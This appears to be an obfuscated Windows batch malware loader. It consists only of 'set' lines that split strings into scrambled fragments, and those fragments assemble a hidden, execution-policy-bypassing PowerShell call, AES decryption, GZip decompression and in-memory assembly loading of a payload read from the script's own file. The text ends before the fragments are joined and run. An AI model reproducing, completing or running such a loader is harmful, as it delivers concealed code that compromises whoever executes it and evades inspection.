@echo off
set "JGhYFNLwZw=we"
set "GqESHQUOog=:\"
set "GqXzCkwzYs=ws"
set "uJbnpNlExa=co"
set "OXuaFyFeNL=he"
set "SHIqeRJhtv=32"
set "DuXNMHceWp=do"
set "OgCnVLloeB=\W"
set "uqNxRtjPAn=we"
set "dsiSTbNpZF= C"
set "CSYjLlwstW=in"
set "qfOSaaJzES=Po"
set "kdiosQQEdB=Wi"
set "YDzdUpDAHi=ll"
set "BzfrhMtsDW=he"
set "bHYKJjOZXO=\v"
set "pLuagpyrVq=st"
set "kimxxXnspF=Sy"
set "JhrOVlUyHB=rS"
set "HtQzzhYKqw=po"
set "ulpymRLDfC=.e"
set "zlwvJhWdiC=ll"
set "rYMTeBuSuC=em"
set "wFokRajTAd=s\"
set "aBbSjqkGfp=y "
set "hIdlCcBito=nd"
set "tQInuXFkuD=rs"
set "sdKAaquDqc=py"
set "NebOpgHoUG=0\"
set "ttScWiunEm= /"
set "ZVFRtbzSSk=ow"
set "gkRdexVMRt=1."
set "CNpNUkBQRT=xe"
set "LUlILaMvEb= %~dp0"
set "vLyFUAEqPL=cd"
set "hPofnOBzYo=ddin"
set "vWKjAXDJmT=ress"
set "XvnCBXXxKc=ptog"
set "oYvXtYDQPF=ke($"
set "OBEDyrSDUe= [st"
set "COboZLSovS=();$"
set "leDxeKDhLl=yste"
set "ryXHbJrNgu=TllA"
set "DZAEwABypE=pose"
set "PnSzWHsqDY='txe"
set "XDZfOULkfl=6esa"
set "GJDSOoASWM=DT ="
set "dNWVvNjoNX=flec"
set "yHDbEkdwQT=-4] "
set "KStQWTDpkJ=();$"
set "JbcoYTEKVW=]::("
set "NCOxVhONcn=YxCN"
set "yTotaqRyGM=[Sys"
set "TojPAkcurs=y]::"
set "CCHaVBwSkL=);$w"
set "DNrUkyOwfz=em.C"
set "mQVhzLEwPP===')"
set "ZVJUlWNIUT=$AVb"
set "xxujVEHyxj=File"
set "oSRcphlqKL=F'[-"
set "yDnfnytPmh=rofi"
set "iiqkGbkWLQ=1..-"
set "ubsDMhtOIm=.Cre"
set "FIApyXNRgw=ispo"
set "fDhjxCCZUd=::('"
set "ZkEDolHhJi=B.Su"
set "XMXaSDSOdd=sion"
set "oFtzVguCBi=yste"
set "TAVOzeByAE=ing("
set "oDTIwIqDhl=xc, "
set "EaDsPNEEZc=$CTu"
set "HbPuVqNUQO=oint"
set "FCNTWjyjww=aR ="
set "fsloVpYnvq=ky);"
set "CDjwZsWcfp=Fina"
set "OsWEdbwwon=ct S"
set "MJgVOVIdRu=pher"
set "LoUOLUmJaB=oL'["
set "KTJGnqVYGP=ress"
set "lDVsckFVmn='[-1"
set "lVaeXbiUdD=DT);"
set "jfftFPkCPO='')("
set "AMJCYSPbaA=7;$K"
set "IZxBwOCDEl=ss -"
set "nXeGearaMp=nirt"
set "xBgeQjIkDe='dqR"
set "PfqItIHZvs=Syst"
set "eQVYDdBDfa=('l0"
set "lDlEULWcpY=rt]:"
set "hdlCqBVDgz=BC;$"
set "gozbmytLoz=vj0m"
set "ReBIKLTekL= [Sy"
set "yaeimqJhCx=);$A"
set "DIngPchaTq=FvES"
set "qdzxYsqtIl=$mvg"
set "CacaMYtIFY=pose"
set "GCMCVLCCLf=rity"
set "SKIHpnzFzT=orF'"
set "UzhPFllblz=cVhD"
set "tCufJQJjRm=ne);"
set "QQThSdHLqv=vgky"
set "wuoSnfKzfs=gnir"
set "SXiPJZLJsy=le  "
set "WECHMzyCjZ= New"
set "hMXcYaulqW=stem"
set "LOGiBPFgMT=tryP"
set "ERclbOwKYD=6] -"
set "jJoxwafxjc=nage"
set "JiHfruQBZF=; };"
set "ryJrzRSsTm=lBlo"
set "TOHdyCBIIO=eam("
set "ONuBkgPHGA=[Sys"
set "rRhrYAHmPM=ateD"
set "hUhTJZMCds=.Con"
set "chGlQxEiBl=('%*'"
set "uHnORYQhqV=+hAO"
set "btLCQhhjzx=mvgk"
set "uNXIvirTfi=ltnF"
set "pEeVmJwzvS=ress"
set "QzKpQlIEwx=em.I"
set "yZJZwayMNY=;$SK"
set "AGVqMlJsRS=bstr"
set "CQDADTzLmz=1] -"
set "YiLZDtzBri=null"
set "jIcVvSigAb=Conv"
set "VaKYRTqnyG== [S"
set "BxqhNpPSpw=m.IO"
set "lveHEBUXCy=($cV"
set "JxDAlEtudF=-joi"
set "BcEprvbWzr=ay()"
set "BDbdAVWSVS=$SKS"
set "PXJNhcSlLJ=R.En"
set "YrbSmcpLIR=rtS4"
set "pnfegPniKH=);$K"
set "wQusDxbWva=ptog"
set "kNDNFmRBfX=16] "
set "fLyEbsRaXS=:: '"
set "bkHasrgVyX=PKCS"
set "fVpsjhMHhg=bypa"
set "ZCytlzlMAq=.Dis"
set "KfcCknfsFN=mory"
set "PowuTHMEyC=pStr"
set "wkxnrZRzCa=pK.D"
set "XTvgivjEaJ=.Mem"
set "ewATibaopb= '')"
set "MofVSZbiWT=ach "
set "yWMnXRvRou=y.Pa"
set "XEJoicQEAj=();$"
set "dXJqnOrGns=y.Cr"
set "IBxweQitZy=ddin"
set "IzOvkgqKsC=lit("
set "UJcyybpMTm=uQh."
set "zYqgzPoQoR=.IO."
set "TIvlXBrnZD=feR "
set "KXUvMuvMni==');"
set "NWKfrWnNqP=g = "
set "dkJVUIREcn=join"
set "qZpexUpdsj=N.Pa"
set "NbXmwyXgrV=.Key"
set "YstPSiPqyi=n ''"
set "YlEttNPuAB=ZYYc"
set "BzxSZNvGob=$KYx"
set "rnTieojYxP=ecry"
set "BFHCVuaWot=Disp"
set "AnVtSavaBX=0O+g"
set "KHjPLdCWMr=yste"
set "adzfRBPXyv=.-16"
set "CfpENHNsNg=t Sy"
set "twvJSVkNJs=CN.I"
set "MkWdKnxpSy=am;$"
set "CMhhhJYgNG=saBm"
set "TXVyKIFBpi=YxCN"
set "OGFUJjziay=tsWi"
set "gVJqvQpwxR=ew-O"
set "jbyIEbsAHk=Comp"
set "uwNtuLfXvA=tem."
set "GtYSQPWShC=.GZi"
set "uTbtpzIrpa=ewLi"
set "owqLTeQsak=isfL"
set "XaOcPdsJdq=e = "
set "FkKvrkgZSN=y, 0"
set "RokuEqsrBA== $K"
set "RLlwHijbLb=SKSx"
set "ZckAZYmicW=se()"
set "jIscXCAtcV=Sxc."
set "VVCQcLDJgz=DT.T"
